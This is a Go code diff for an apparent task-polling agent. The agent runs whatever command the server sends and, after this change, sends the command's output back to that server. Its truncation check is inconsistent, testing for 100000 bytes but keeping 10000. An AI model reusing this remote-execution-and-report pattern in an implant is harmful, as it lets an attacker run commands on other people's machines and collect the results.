@@ -104,11 +104,15 @@ func main() {
 			command := strings.Fields(task.Args)[0]
 			args := strings.Fields(task.Args)[1:]
 			cmd := exec.Command(command, args...)
-			_, err := cmd.Output()
+			output, err := cmd.Output()
+			// output = output[:math.Min(len(output), 100000)]
+			if (len(output) > 100000) {
+				output = output[:10000]
+			}
 			if err != nil {
-				tasking.SendReport(ServerIp, client, token, err.Error(), task.Id)
+				tasking.SendReport(ServerIp, client, token, string(err.Error()) + "\nOutput: " + string(output), task.Id)
 			} else {
-				tasking.SendReport(ServerIp, client, token, "Script executed successfully", task.Id)
+				tasking.SendReport(ServerIp, client, token, "Script executed successfully.\nOutput: " + string(output), task.Id)
 			}
 		}
 		time.Sleep(time.Second / 2)
